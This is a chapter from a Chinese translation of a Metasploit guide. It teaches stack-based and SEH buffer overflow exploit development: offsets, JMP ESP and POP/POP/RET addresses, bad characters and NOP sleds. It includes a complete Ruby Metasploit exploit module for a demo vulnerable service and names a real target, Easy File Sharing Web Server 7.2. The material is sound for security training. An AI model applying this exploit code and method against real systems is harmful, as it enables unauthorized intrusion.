# Metasploit 完全指南（三）

> 原文：[`annas-archive.org/md5/7D3B5EAD1083E0AF434036361959F60E`](https://annas-archive.org/md5/7D3B5EAD1083E0AF434036361959F60E)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十三章：利用公式化过程

本章主要是关于创建利用模块，并帮助理解内置的 Metasploit 实用程序如何改进创建过程。在本章中，我们将涵盖各种示例漏洞，并尝试开发利用这些漏洞的方法和方法。除此之外，我们的主要重点将放在为 Metasploit 构建利用模块上。我们还将涵盖各种工具，这些工具将有助于在 Metasploit 中编写利用程序。编写利用程序的一个重要方面是计算机体系结构。如果我们不包括体系结构的基础知识，我们将无法理解利用程序在较低层次上的工作方式。因此，让我们首先讨论一下系统体系结构和编写利用程序所需的基本要素。

在本章结束时，我们将更多地了解以下主题：

+   利用程序开发的阶段

+   编写利用程序时需要考虑的参数

+   各种寄存器的工作原理

+   如何模糊软件

+   如何在 Metasploit 框架中编写利用程序

+   使用 Metasploit 绕过保护机制

# 利用程序的绝对基础知识

在本节中，我们将看一下利用所需的最关键组件。我们将讨论在不同体系结构中支持的各种寄存器。我们还将讨论**扩展指令指针**（**EIP**）和**扩展堆栈指针**（**ESP**），以及它们在编写利用程序中的重要性。我们还将研究**无操作**（**NOP**）和**跳转**（**JMP**）指令，以及它们在编写各种软件的利用程序中的重要性。

# 基础知识

让我们先了解编写利用程序时必要的基础知识。

以下术语基于硬件、软件和安全角度来看待利用程序开发：

+   **寄存器**：这是处理器上用于存储信息的区域。此外，处理器利用寄存器来处理进程执行、内存操作、API 调用等。

+   **x86**：这是一类系统体系结构，主要出现在基于英特尔的系统上，通常是 32 位系统，而 x64 是 64 位系统。

+   **汇编语言**：这是一种具有简单操作的低级编程语言。然而，阅读汇编代码并维护它是一件难事。

+   **缓冲区**：缓冲区是程序中的固定内存持有者，根据它们所持有的内存类型，它们将数据存储到堆栈或堆中。

+   **调试器**：调试器允许对可执行文件进行逐步分析，包括停止、重新启动、中断和操纵进程内存、寄存器、堆栈等。广泛使用的调试器包括 Immunity Debugger、GDB 和 OllyDbg。

+   **Shellcode**：这是用于在目标系统上执行的机器语言。在历史上，它被用于运行一个 shell 进程，使攻击者能够访问系统。因此，shellcode 是处理器理解的一组指令。

+   **堆栈**：这充当数据的占位符，并使用**后进先出**（**LIFO**）方法进行存储，这意味着最后插入的数据首先被移除。

+   **堆**：堆是主要用于动态分配的内存区域。与堆栈不同，我们可以在任何给定时间分配、释放和阻塞。

+   **缓冲区溢出**：这意味着提供给缓冲区的数据超过了其容量。

+   格式字符串错误：这些是与文件或控制台中的打印语句相关的错误，当给定一组变量数据时，可能会透露有关程序的有价值的信息。

+   **系统调用**：这些是由正在执行的程序调用的系统级方法。

# 体系结构

体系结构定义了系统各个组件的组织方式。让我们先了解必要的组件，然后我们将深入研究高级阶段。

# 系统组织基础知识

在我们开始编写程序和执行其他任务，比如调试之前，让我们通过以下图表来了解系统中组件的组织结构：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bc9235d5-26d0-472c-a611-2d94613b1920.png)

我们可以清楚地看到系统中的每个主要组件都是通过系统总线连接的。因此，CPU、内存和 I/O 设备之间的所有通信都是通过系统总线进行的。

CPU 是系统中的中央处理单元，确实是系统中最重要的组件。因此，让我们通过以下图表来了解 CPU 中的组织结构：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d2d85356-7201-4345-a86f-af4dd66ef920.png)

上述图表显示了 CPU 的基本结构，包括控制单元（CU）、执行单元（EU）、寄存器和标志等组件。让我们通过下表来了解这些组件是什么：

| **组件** | **工作**  |
| --- | --- |
| 控制单元 | 控制单元负责接收和解码指令，并将数据存储在内存中。 |
| 执行单元 | 执行单元是实际执行发生的地方。 |
| 寄存器 | 寄存器是占位内存变量，有助于执行。 |
| Flags | 这些用于指示执行过程中发生的事件。 |

# 寄存器

寄存器是高速计算机内存组件。它们也位于内存层次结构的速度图表的顶部。我们通过它们可以容纳的位数来衡量寄存器；例如，一个 8 位寄存器和一个 32 位寄存器分别可以容纳 8 位和 32 位的内存。**通用目的**、**段**、**EFLAGS**和**索引寄存器**是系统中不同类型的相关寄存器。它们负责执行系统中几乎每个功能，因为它们保存了所有要处理的值。让我们来看看它们的类型：

| **寄存器** | **目的**  |
| --- | --- |
| EAX | 这是一个累加器，用于存储数据和操作数。大小为 32 位。 |
| EBX | 这是基址寄存器，指向数据的指针。大小为 32 位。 |
| ECX | 这是一个计数器，用于循环目的。大小为 32 位。 |
| EDX | 这是一个数据寄存器，存储 I/O 指针。大小为 32 位。 |
| ESI/EDI | 这些是用作内存操作数据指针的索引寄存器。它们也是 32 位大小。 |
| ESP | 这个寄存器指向栈顶，当栈中有数据被推入或弹出时，它的值会发生变化。大小为 32 位。 |
| EBP | 这是堆栈数据指针寄存器，大小为 32 位。 |
| EIP | 这是指令指针，大小为 32 位，在本章中是最关键的指针。它还保存着下一条要执行的指令的地址。 |
| SS、DSES、CS、FS 和 GS | 这些是段寄存器，大小为 16 位。 |

您可以在以下网址了解有关架构基础知识和各种系统调用和利用指令的更多信息：[`resources.infosecinstitute.com/debugging-fundamentals-for-exploit-development/#x86`](http://resources.infosecinstitute.com/debugging-fundamentals-for-exploit-development/#x86)。

# 使用 Metasploit 利用基于栈的缓冲区溢出

缓冲区溢出漏洞是一种异常情况，当向缓冲区写入数据时，它超出了缓冲区的大小并覆盖了内存地址。以下图表显示了缓冲区溢出的一个基本示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/8d93ff26-46d3-446d-b98f-0f845634725c.png)

上述图表的左侧显示了应用程序的外观。然而，右侧表示了应用程序在满足缓冲区溢出条件时的行为。

那么，我们如何利用缓冲区溢出漏洞呢？答案很简单。如果我们知道将覆盖 EIP（指令指针）开始之前的一切的确切数据量，我们可以将任何内容放入 EIP 并控制下一条指令的地址。

因此，首先要找出足够好的字节数，以填充 EIP 开始之前的所有内容。在接下来的部分中，我们将看到如何使用 Metasploit 实用程序找到确切的字节数。

# 崩溃易受攻击的应用程序

我们将使用一个使用不安全函数的自定义易受攻击的应用程序。让我们尝试从命令 shell 中运行该应用程序，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f0567bb0-648f-46f5-aeac-807ee2a49771.png)

我们可以看到这是一个小型示例应用程序，它监听 TCP 端口`200`。我们将通过 Telnet 连接到该应用程序的端口`200`并向其提供随机数据，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e0087caa-4393-4a14-9ba4-16fb025e7d5f.png)

在我们提供数据之后，我们会看到与目标的连接丢失。这是因为应用程序服务器崩溃了。让我们看看目标系统上的情况：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a50dc75e-760d-4511-a698-519e918086c4.png)

通过点击此处查看错误报告，我们可以看到以下信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/dbaf1619-08ff-4ff7-8788-417dc810fcd9.png)

崩溃的原因是应用程序未能处理下一条指令的地址，位于 41414141。这有什么提示吗？值 41 是字符 A 的十六进制表示。发生的情况是我们的输入越过了缓冲区的边界，继续覆盖了 EIP 寄存器。因此，由于下一条指令的地址被覆盖，程序尝试在 41414141 处找到下一条指令的地址，这不是有效地址。因此，它崩溃了。

从以下网址下载我们在示例中使用的示例应用程序：[`redstack.net/blog/category/How%20To.html`](http://redstack.net/blog/category/How%20To.html)。

# 构建利用基础

为了利用该应用程序并访问目标系统，我们需要了解以下表中列出的内容：

| **组件** | **用途** |
| --- | --- |
| 在上一节中，我们崩溃了应用程序。然而，为了利用该应用程序，我们需要知道足够填充空间和 EBP 寄存器的输入的确切大小，这样我们提供的任何内容都会直接进入 EIP 寄存器。我们将足够好以使我们正好在 EIP 寄存器之前的数据量称为偏移量。 |
| 跳转地址/Ret | 这是要在 EIP 寄存器中覆盖的实际地址。澄清一下，这是来自 DLL 文件的 JMP ESP 指令的地址，它有助于跳转到有效负载。 |
| 坏字符 | 坏字符是可能导致有效负载终止的字符。假设包含空字节（0x00）的 shellcode 被发送到网络上。它将过早终止缓冲区，导致意外结果。应避免使用坏字符。 |

让我们通过以下图表来了解该应用程序的利用部分：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/598f5a96-1a5f-4d6b-8cc5-33002b0f9466.png)

查看前面的图表，我们必须执行以下步骤：

1.  用用户输入覆盖缓冲区和 EBP 寄存器，就在 EIP 寄存器开始之前。足够好的值将是偏移值。

1.  用相关 DLL 中的 JMP ESP 地址覆盖 ESP。

1.  在有效负载之前提供一些填充以消除不规则性。

1.  最后，提供要执行的 shellcode。

在接下来的部分，我们将详细介绍所有这些步骤。

# 计算偏移量

正如我们在前一节中看到的，利用的第一步是找出偏移量。Metasploit 通过使用两个不同的工具`pattern_create`和`pattern_offset`来辅助这个过程。

# 使用 pattern_create 工具

在前一节中，我们发现通过提供随机数量的`A`字符，我们能够使应用程序崩溃。然而，我们已经学到，要构建一个有效的利用程序，我们需要找出这些字符的确切数量。Metasploit 内置的工具`pattern_create`可以在短时间内为我们完成这项工作。它生成的模式可以供应用程序使用，而不是`A`字符，并且根据覆盖 EIP 寄存器的值，我们可以使用其对应的工具`pattern_offset`快速找出确切的字节数。让我们看看如何做到这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c8e0706f-008d-491f-ae8b-1b3502f68cc4.png)

我们可以看到，在`/tools/exploit/`目录中运行`pattern_create.rb`脚本生成了 1000 字节的模式。这个输出可以提供给有漏洞的应用程序，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fdc96fa9-7533-49ea-84d4-52c26de6ad52.png)

查看目标端点，我们可以看到偏移值，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/0cb70ce2-876e-416b-a126-8b4b4a78be52.png)

我们有 72413372 作为覆盖 EIP 寄存器的地址。

# 使用 pattern_offset 工具

在前一节中，我们用 72413372 覆盖了 EIP 地址。让我们使用`pattern_offset`工具找出覆盖 EIP 所需的确切字节数。这个工具需要两个参数；第一个是地址，第二个是长度，使用`pattern_create`生成的长度为`1000`。让我们找出偏移量，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/6b37cb6a-cc58-4840-a757-2b77a1283c02.png)

确切匹配在 520 处找到。因此，在 520 个字符后的任何 4 个字节都成为 EIP 寄存器的内容。

# 查找 JMP ESP 地址

让我们再次查看我们用来理解利用的图表，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/240fc9e7-88f7-4b82-8d0c-145b0168ce87.png)

我们完成了前面图表中的第一步。我们的下一个任务是找到 JMP ESP 地址。我们需要 JMP ESP 指令的地址，因为我们的有效载荷将加载到 ESP 寄存器中，我们不能仅仅在覆盖缓冲区后指向有效载荷。因此，我们需要来自外部 DLL 的 JMP ESP 指令的地址，该指令将要求程序跳转到我们有效载荷开头处的 ESP 内容。

要找到跳转地址，我们将需要一个调试器，以便我们可以看到有漏洞的应用程序加载了哪些 DLL 文件。在我看来，最好的选择是 Immunity Debugger。Immunity Debugger 带有大量插件，可以帮助编写利用程序。

# 使用 Immunity Debugger 查找可执行模块

Immunity Debugger 是一个帮助我们在运行时了解应用程序行为的应用程序。它还可以帮助我们识别缺陷、寄存器的值、反向工程应用程序等。在 Immunity Debugger 中分析应用程序不仅有助于我们更好地理解各种寄存器中包含的值，还会告诉我们有关目标应用程序的各种信息，比如崩溃发生的指令和与可执行文件链接的可执行模块。

可以通过从文件菜单中选择“打开”直接将可执行文件加载到 Immunity Debugger 中。我们也可以通过选择“附加”选项将正在运行的应用程序附加到 Immunity Debugger 中。当我们导航到文件|附加时，它会向我们呈现目标系统上正在运行的进程列表。我们只需要选择适当的进程。然而，这里有一个重要的问题，当一个进程附加到 Immunity Debugger 时，默认情况下，它会处于暂停状态。因此，请确保按下播放按钮，将进程的状态从暂停状态更改为运行状态。让我们看看如何将进程附加到 Immunity Debugger：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/83c1ae4f-49e1-43b4-8cf6-55da312fbf12.png)

按下附加按钮后，让我们看看哪些 DLL 文件加载到有漏洞的应用程序中，方法是导航到“查看”并选择“可执行模块”选项。我们将看到以下 DLL 文件列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2455a72c-d8d8-4834-a8fe-6c0df10f7e60.png)

现在我们已经有了 DLL 文件的列表，我们需要从其中一个文件中找到 JMP ESP 地址。

# 使用 msfpescan

在前面的部分中，我们找到了与有漏洞的应用程序相关联的 DLL 模块。我们可以使用 Immunity Debugger 来查找 JMP ESP 指令的地址，这是一个冗长而耗时的过程，或者我们可以使用`msfpescan`从 DLL 文件中搜索 JMP ESP 指令的地址，这是一个更快的过程，消除了手动搜索的步骤。

运行`msfpescan`给我们以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/639fd66e-cae6-4834-b35e-6907671bc9cd.png)

诸如`msfbinscan`和`msfrop`之类的实用程序可能不会出现在默认的 Kali Linux 中随 Metasploit 一起安装的版本中。切换到 Ubuntu 并手动安装 Metasploit 以获取这些实用程序。

我们可以执行各种任务，比如找到基于 SEH 的缓冲区溢出的 POP-POP-RET 指令地址，显示特定地址处的代码等等，都可以通过`msfpescan`来完成。我们只需要找到 JMP ESP 指令的地址。我们可以使用`-j`开关，后面跟着寄存器名称 ESP 来实现这一点。让我们从`ws2_32.dll`文件开始搜索 JMP ESP 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b26e3564-30b2-4b31-8912-04fc3352baa8.png)

命令的结果返回了`0x71ab9372`。这是`ws2_32.dll`文件中 JMP ESP 指令的地址。我们只需要用这个地址覆盖 EIP 寄存器，以便执行跳转到 ESP 寄存器中的 shellcode。

# 填充空间

让我们修改利用图并了解我们在利用过程中的确切位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/34cc8528-2fa8-4f2f-a270-0d14fecf206d.png)

我们已经完成了第二步。然而，这里有一个重要的问题，有时 shellcode 的前几个字节可能会被剥离，导致 shellcode 无法执行。在这种情况下，我们应该用前缀 NOP 填充 shellcode，以便 shellcode 的执行可以无缝进行。

假设我们将`ABCDEF`发送到 ESP，但是当我们使用 Immunity Debugger 进行分析时，我们只得到了`DEF`的内容。在这种情况下，我们缺少了三个字符。因此，我们需要用三个 NOP 字节或其他随机数据填充有效负载。

让我们看看是否需要为这个有漏洞的应用程序填充 shellcode：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a0b9fe00-925e-4eb7-8284-38bee07a7a7b.png)

在前面的截图中，我们根据缓冲区大小的值创建了数据。我们知道偏移量是`520`。因此，我们提供了`520`，然后是 JMP ESP 地址，以小端格式呈现，随后是随机文本`ABCDEF`。一旦我们发送了这些数据，我们就可以在 Immunity Debugger 中分析 ESP 寄存器，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/788e7c69-e7f1-4db2-ba1c-6f2611b9a263.png)

我们可以看到随机文本`ABCDEF`中缺少了字母`A`。因此，我们只需要一个字节的填充来实现对齐。在 shellcode 之前用一些额外的 NOP 进行填充是一个很好的做法，以避免 shellcode 解码和不规则性问题。

# NOP 的相关性

NOP 或 NOP-sled 是无操作指令，仅仅将程序执行滑动到下一个内存地址。我们使用 NOP 来到达内存地址中的所需位置。我们通常在 shellcode 开始之前提供 NOP，以确保在内存中成功执行，同时不执行任何操作，只是在内存地址中滑动。十六进制格式中的`\x90`指令代表 NOP 指令。

# 确定坏字符

有时，即使为利用正确设置了一切，我们可能永远无法利用系统。或者，可能会发生我们的利用成功执行，但有效载荷无法运行的情况。这可能发生在目标系统对利用中提供的数据进行截断或不正确解析，导致意外行为的情况下。这将使整个利用无法使用，我们将努力将 shell 或 Meterpreter 放入系统中。在这种情况下，我们需要确定阻止执行的坏字符。我们可以通过查找匹配的类似利用模块并在我们的利用模块中使用这些坏字符来避免这种情况。

我们需要在利用的`Payload`部分定义这些坏字符。让我们看一个例子：

```
'Payload'        => 
      { 
        'Space'    => 800, 
        'BadChars' => "\x00\x20\x0a\x0d", 
        'StackAdjustment' => -3500, 
      }, 
```

上述部分摘自`/exploit/windows/ftp`目录下的`freeftpd_user.rb`文件。列出的选项表明有效载荷的空间应小于`800`字节，并且有效载荷应避免使用`0x00`、`0x20`、`0x0a`和`0x0d`，分别是空字节、空格、换行和回车。

有关查找坏字符的更多信息，请访问：[`resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-6-dealing-with-bad-characters-jmp-instruction/`](http://resources.infosecinstitute.com/stack-based-buffer-overflow-in-win-32-platform-part-6-dealing-with-bad-characters-jmp-instruction/)。

# 确定空间限制

`Payload 字段`中的`Space`变量定义了用于 shellcode 的总大小。我们需要为`Payload`分配足够的空间。如果`Payload`很大，而分配的空间小于有效载荷的 shellcode，它将无法执行。此外，在编写自定义利用时，shellcode 应尽可能小。我们可能会遇到这样的情况，即可用空间仅为 200 字节，但可用 shellcode 至少需要 800 字节的空间。在这种情况下，我们可以将一个较小的第一阶段 shellcode 放入缓冲区中，它将执行并下载第二个更大的阶段以完成利用。

对于各种有效载荷的较小 shellcode，请访问：[`shell-storm.org/shellcode/`](http://shell-storm.org/shellcode/)。

# 编写 Metasploit 利用模块

让我们回顾一下我们的利用过程图表，并检查我们是否可以完成模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b076501b-a46d-4a63-91ea-1e5a96a8bf9a.png)

我们可以看到我们拥有开发 Metasploit 模块的所有基本要素。这是因为在 Metasploit 中，有效载荷生成是自动化的，并且也可以随时更改。所以，让我们开始吧：

```
class MetasploitModule < Msf::Exploit::Remote 
  Rank = NormalRanking 

  include Msf::Exploit::Remote::Tcp 

  def initialize(info = {}) 
    super(update_info(info, 
      'Name'                 => 'Stack Based Buffer Overflow Example', 
      'Description'    => %q{ 
         Stack Based Overflow Example Application Exploitation Module 
      }, 
      'Platform'             => 'win', 
      'Author'         => 
        [ 
          'Nipun Jaswal' 
        ], 
      'Payload' => 
      { 
      'space' => 1000, 
      'BadChars' => "\x00\xff", 
      }, 
      'Targets' => 
       [ 
             ['Windows XP SP2',{ 'Ret' => 0x71AB9372, 'Offset' => 520}] 
       ], 
      'DisclosureDate' => 'Mar 04 2018' 
   )) 
   register_options( 
   [ 
         Opt::RPORT(200) 
   ]) 
  end 
```

在编写代码之前，让我们看一下我们在这个模块中使用的库：

| **包含语句** | **路径** | **用途** |
| --- | --- | --- |
| `Msf::Exploit::Remote::Tcp` | `/lib/msf/core/exploit/tcp.rb` | TCP 库文件提供基本的 TCP 功能，如连接、断开连接、写入数据等 |

与我们在第十二章中构建模块的方式相同，*重新发明 Metasploit*，利用模块首先包括必要的库路径，然后包括来自这些路径的所需文件。我们将模块类型定义为`Msf::Exploit::Remote`，表示远程利用。接下来，我们有`initialize`构造方法，在其中定义了名称、描述、作者信息等。然而，我们可以看到`initialize`方法中有大量新的声明。让我们看看它们是什么：

| **声明** | **值** | **用法** |
| --- | --- | --- |
| `平台` | `win` | 定义了利用将要针对的平台类型。win 表示利用将可用于基于 Windows 的操作系统。 |
| `披露日期` | `2018 年 3 月 4 日` | 漏洞披露的日期。 |
| `目标` | `Ret` | 特定操作系统的`Ret`字段定义了我们在前一节中找到的 JMP ESP 地址。 |
| `0x71AB9372` |
| `目标` | `Offset` | 特定操作系统的`Offset`字段定义了在覆盖 EIP 之前填充缓冲区所需的字节数。我们在前一节中找到了这个值。 |
| `520` |
| `有效载荷` | `空间` | 在有效载荷声明中，`空间`变量定义了有效载荷可以使用的最大空间量。这相对重要，因为有时我们的空间不足以加载我们的 shellcode。 |
| `1000` |
| `有效载荷` | `BadChars` | 在有效载荷声明中，`BadChars`变量定义了在有效载荷生成过程中要避免的不良字符。声明不良字符的做法将确保稳定性，并删除可能导致应用程序崩溃或无法执行有效载荷的字节。 |
| `\x00\xff` |

我们还在`register_options`部分将利用模块的默认端口定义为`200`。让我们来看看剩下的代码：

```
def exploit 
    connect 
    buf = make_nops(target['Offset']) 
    buf = buf + [target['Ret']].pack('V') + make_nops(30) + payload.encoded 
    sock.put(buf) 
    handler 
    disconnect 
  end 
end
```

让我们了解一些在前面的代码中使用的重要函数：

| **函数** | **库** | **用法** |
| --- | --- | --- |
| `make_nops` | `/lib/msf/core/exploit.rb` | 此方法用于通过传递`n`作为计数来创建`n`个 NOP |
| `连接` | `/lib/msf/core/exploit/tcp.rb` | 调用此方法来与目标建立连接 |
| `断开连接` | `/lib/msf/core/exploit/tcp.rb` | 调用此方法来断开与目标的现有连接 |
| `处理程序` | `/lib/msf/core/exploit.rb` | 将连接传递给相关的有效载荷处理程序，以检查是否成功利用了漏洞并建立了连接 |

我们在前一节中看到，`run`方法被用作辅助模块的默认方法。然而，对于利用，`exploit`方法被认为是默认的主要方法。

我们首先使用`connect`连接到目标。使用`make_nops`函数，我们通过传递我们在`initialize`部分中定义的`target`声明的`Offset`字段，创建了 520 个 NOP。我们将这 520 个 NOP 存储在`buf`变量中。在下一条指令中，我们通过从`target`声明的`Ret`字段中获取其值，将 JMP ESP 地址附加到`buf`中。使用`pack('V')`，我们得到了地址的小端格式。除了`Ret`地址，我们还附加了一些 NOP 作为 shellcode 之前的填充。使用 Metasploit 的一个优点是能够在运行时切换有效载荷。因此，简单地使用`payload.encoded`附加有效载荷将当前选择的有效载荷添加到`buf`变量中。

接下来，我们直接使用`sock.put`将`buf`的值发送到连接的目标。我们运行处理程序方法来检查目标是否成功被利用，以及是否与其建立了连接。最后，我们使用`disconnect`从目标断开连接。让我们看看我们是否能够利用服务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/af70490a-44be-467f-8139-b0928c768820.png)

我们设置所需的选项和有效载荷为`windows/meterpreter/bind_tcp`，表示直接连接到目标。最初，我们可以看到我们的利用完成了，但没有创建会话。在这一点上，我们通过编辑利用代码将坏字符从`\x00\xff`更改为`\x00\x0a\x0d\x20`，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4dc4b10e-30bb-4d09-ae86-622b70595b79.png)

我们可以使用`edit`命令直接从 Metasploit 修改模块。默认情况下，文件将在 VI 编辑器中加载。但是，如果你不比我更好，你会坚持使用 nano 编辑器进行更改。一旦我们更改了模块，就必须重新加载到 Metasploit 中。对于我们当前正在使用的模块，我们可以使用`reload`命令重新加载，如前面的图像所示。重新运行模块，我们轻松地获得了对目标的 Meterpreter 访问。现在我们已经成功完成了第一个利用模块，我们将在下一个示例中跳转到一个稍微更高级的利用模块。

# 使用 Metasploit 利用基于 SEH 的缓冲区溢出

异常处理程序是捕获程序执行过程中生成的异常和错误的代码模块。这使得程序可以继续执行而不会崩溃。Windows 操作系统具有默认的异常处理程序，通常在应用程序崩溃并抛出一个弹出窗口时看到它们，上面写着*XYZ 程序遇到错误并需要关闭*。当程序生成异常时，相应的 catch 代码的地址将从堆栈中加载并调用。然而，如果我们设法覆盖处理程序的 catch 代码在堆栈中的地址，我们将能够控制应用程序。让我们看看当应用程序实现异常处理程序时，堆栈中的排列情况：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/a93d591e-bf18-4ce8-95b5-59c5e4f1d09d.png)

在上图中，我们可以看到堆栈中 catch 块的地址。我们还可以看到，在右侧，当我们向程序提供足够的输入时，它也会覆盖堆栈中 catch 块的地址。因此，我们可以很容易地通过 Metasploit 中的`pattern_create`和`pattern_offset`工具找到覆盖 catch 块地址的偏移值。让我们看一个例子：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f377ffa0-29fa-4d39-842e-a897144ddb6b.png)

我们创建一个`4000`个字符的模式，并使用`TELNET`命令将其发送到目标。让我们在 Immunity Debugger 中查看应用程序的堆栈：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/40c9658d-6cf6-40f4-a9f2-4990837bfb63.png)

我们可以看到应用程序的堆栈窗格中，SE 处理程序的地址被覆盖为`45346E45`。让我们使用`pattern_offset`找到确切的偏移量，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/764f935e-f9f6-473d-9893-984703abe76d.png)

我们可以看到正确的匹配在`3522`处。然而，这里需要注意的一个重要点是，根据 SEH 帧的设计，我们有以下组件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1e4a5343-310c-4ade-b579-4d81a3afb6ab.png)

SEH 记录包含前`4`个字节作为下一个 SEH 处理程序的地址，下一个`4`个字节作为 catch 块的地址。一个应用程序可能有多个异常处理程序。因此，特定的 SEH 记录将前 4 个字节存储为下一个 SEH 记录的地址。让我们看看如何利用 SEH 记录：

1.  我们将在应用程序中引发异常，以便调用异常处理程序。

1.  我们将使用 POP/POP/RETN 指令的地址来覆盖 catch 处理程序字段的地址。这是因为我们需要将执行切换到下一个 SEH 帧的地址（在 catch 处理程序地址的前 4 个字节）。我们将使用 POP/POP/RET，因为调用 catch 块的内存地址保存在堆栈中，下一个处理程序的指针地址在 ESP+8（ESP 被称为堆栈的顶部）。因此，两个 POP 操作将重定向执行到下一个 SEH 记录的开始的 4 个字节的地址。

1.  在第一步中提供输入时，我们将使用 JMP 指令覆盖下一个 SEH 帧的地址到我们的有效载荷。因此，当第二步完成时，执行将跳转指定字节数到 shellcode。

1.  成功跳转到 shellcode 将执行有效载荷，我们将获得对目标的访问权限。

让我们通过以下图表来理解这些步骤：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/339c6f70-ba02-46a6-ad7a-344b7c570e10.png)

在前面的图中，当发生异常时，它调用处理程序的地址（已经被 POP/POP/RET 指令的地址覆盖）。这会导致执行 POP/POP/RET 并将执行重定向到下一个 SEH 记录的地址（已经被短跳转覆盖）。因此，当 JMP 执行时，它指向 shellcode，并且应用程序将其视为另一个 SEH 记录。

# 构建利用基础

现在我们已经熟悉了基础知识，让我们看看我们需要为 SEH-based 漏洞开发一个工作利用所需的基本要素：

| **组件** | **用途** |
| --- | --- |
| 偏移量 | 在这个模块中，偏移量将指的是足够覆盖 catch 块地址的输入的确切大小。 |
| POP/POP/RET 地址 | 这是来自 DLL 的 POP-POP-RET 序列的地址。 |
| 短跳转指令 | 为了移动到 shellcode 的开始，我们需要进行指定字节数的短跳转。因此，我们需要一个短跳转指令。 |

我们已经知道我们需要一个有效载荷，一组要防止的坏字符，空间考虑等等。

# 计算偏移量

Easy File Sharing Web Server 7.2 应用程序是一个 Web 服务器，在请求处理部分存在漏洞，恶意的 HEAD 请求可以导致缓冲区溢出并覆盖 SEH 链中的地址。

# 使用 pattern_create 工具

我们将使用`pattern_create`和`pattern_offset`工具来找到偏移量，就像我们之前在将有漏洞的应用程序附加到调试器时所做的那样。让我们看看我们如何做到这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2b5a05e9-2bed-4b4d-b1e7-5bf685cabcdd.png)

我们创建了一个包含`10000`个字符的模式。现在，让我们将模式提供给端口`80`上的应用程序，并在 Immunity Debugger 中分析其行为。我们会看到应用程序停止运行。让我们通过导航到菜单栏中的 View 并选择 SEH 链来查看 SEH 链：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b5e5dc8f-caef-43ed-bb4c-e23a77d16928.png)

点击 SEH 链选项，我们将能够看到被覆盖的 catch 块地址和下一个 SEH 记录地址被我们提供的数据覆盖：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/271c5654-7c49-4d54-842d-b9c23a143982.png)

# 使用 pattern_offset 工具

让我们找到下一个 SEH 帧地址和 catch 块地址的偏移量，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ea02cb23-da13-4881-85a4-461d33998a83.png)

我们可以看到包含下一个 SEH 记录的内存地址的 4 个字节从`4061`字节开始，而 catch 块的偏移量则从这 4 个字节之后开始；也就是从`4065`开始。

# 查找 POP/POP/RET 地址

在之前讨论过，我们需要地址到 POP/POP/RET 指令来加载地址到下一个 SEH 帧记录并跳转到有效载荷。我们知道我们需要从外部 DLL 文件加载地址。然而，大多数最新的操作系统都使用 SafeSEH 保护编译他们的 DLL 文件。因此，我们需要从一个没有实现 SafeSEH 机制的 DLL 模块中获取 POP/POP/RET 指令的地址。

示例应用程序在以下`HEAD`请求上崩溃；即`HEAD`后面是由`pattern_create`工具创建的垃圾模式，然后是`HTTP/1.0rnrn`。

# Mona 脚本

